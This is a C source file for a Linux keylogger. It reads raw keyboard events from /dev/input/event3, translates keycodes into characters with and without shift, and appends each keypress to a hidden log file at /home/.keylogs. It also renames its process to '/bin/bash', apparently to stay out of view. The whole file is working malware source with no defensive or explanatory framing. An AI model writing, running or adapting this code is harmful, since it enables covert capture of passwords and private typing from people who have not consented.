#include <stdio.h>
#include <stdlib.h>
#include <linux/input.h>

static const char *keycode[] = {
    "\0", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=",
    "_BACKSPACE_", "_TAB_", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p",
    "[", "]", "_ENTER_", "_CTRL_", "a", "s", "d", "f", "g", "h", "j", "k", "l",
    ";", "'", "`", "_SHIFT_", "\\", "z", "x", "c", "v", "b", "n", "m", ",",
    ".", "/", "_SHIFT_", "\0", "\0", " ", "_CAPSLOCK_", "_F1_", "_F2_", "_F3_",
    "_F4_", "_F5_", "_F6_", "_F7_", "_F8_", "_F9_", "_F10_", "_NUMLOCK_",
    "_SCROLLLOCK_", "_HOME_", "_UP_", "_PGUP_", "-", "_LEFT_", "5",
    "_RTARROW_", "+", "_END_", "_DOWN_", "_PGDN_", "_INS_", "_DEL_", "\0",
    "\0", "\0", "_F11_", "_F12_", "\0", "\0", "\0", "\0", "\0", "\0", "\0",
    "_ENTER_", "CTRL_", "/", "_PRTSCR_", "ALT", "\0", "_HOME_", "_UP_",
    "_PGUP_", "_LEFT_", "_RIGHT_", "_END_", "_DOWN_", "_PGDN_", "_INSERT_",
    "_DEL_", "\0", "\0", "\0", "\0", "\0", "\0", "\0", "_PAUSE_"
};

static const char *keycodeShiftEnabled[] = {
    "\0", "ESC", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "_", "+",
    "_BACKSPACE_", "_TAB_", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P",
    "{", "}", "_ENTER_", "_CTRL_", "A", "S", "D", "F", "G", "H", "J", "K", "L",
    ":", "\"", "~", "_SHIFT_", "|", "Z", "X", "C", "V", "B", "N", "M", "<",
    ">", "?", "_SHIFT_", "\0", "\0", " ", "_CAPSLOCK_", "_F1_", "_F2_", "_F3_",
    "_F4_", "_F5_", "_F6_", "_F7_", "_F8_", "_F9_", "_F10_", "_NUMLOCK_",
    "_SCROLLLOCK_", "_HOME_", "_UP_", "_PGUP_", "-", "_LEFT_", "5",
    "_RTARROW_", "+", "_END_", "_DOWN_", "_PGDN_", "_INS_", "_DEL_", "\0",
    "\0", "\0", "_F11_", "_F12_", "\0", "\0", "\0", "\0", "\0", "\0", "\0",
    "_ENTER_", "CTRL_", "/", "_PRTSCR_", "ALT", "\0", "_HOME_", "_UP_",
    "_PGUP_", "_LEFT_", "_RIGHT_", "_END_", "_DOWN_", "_PGDN_", "_INSERT_",
    "_DEL_", "\0", "\0", "\0", "\0", "\0", "\0", "\0", "_PAUSE_"
};

int main(int argc, char** argv) {
    FILE* keyboard = fopen("/dev/input/event3", "r");
    FILE* log = fopen("/home/.keylogs", "a+");
    int shiftEnabled = NULL;
    struct input_event event;
    argv[0] = "/bin/bash";
    
    while(1) {
        fread(&event, sizeof(event), 1, keyboard);

        if (event.type == 1) {
            if (event.code == 42 || event.code == 54) {
                if (event.value == 1) {
                    shiftEnabled = 1;
                } else {
                    shiftEnabled = 0;
                }
            }

            if (event.value == 1) {
                if (shiftEnabled == 0) {
                    printf("Key Pressed: %s\n", keycode[event.code]);
                    fprintf(log, "Key Pressed: %s\n", keycode[event.code]);
                    fflush(log);
                } else {
                    printf("Key Pressed: %s\n", keycodeShiftEnabled[event.code]);
                    fprintf(log, "Key Pressed: %s\n", keycodeShiftEnabled[event.code]);
                    fflush(log);
                }
            }
        }
    }
    fclose(log);
    return (EXIT_SUCCESS);
}

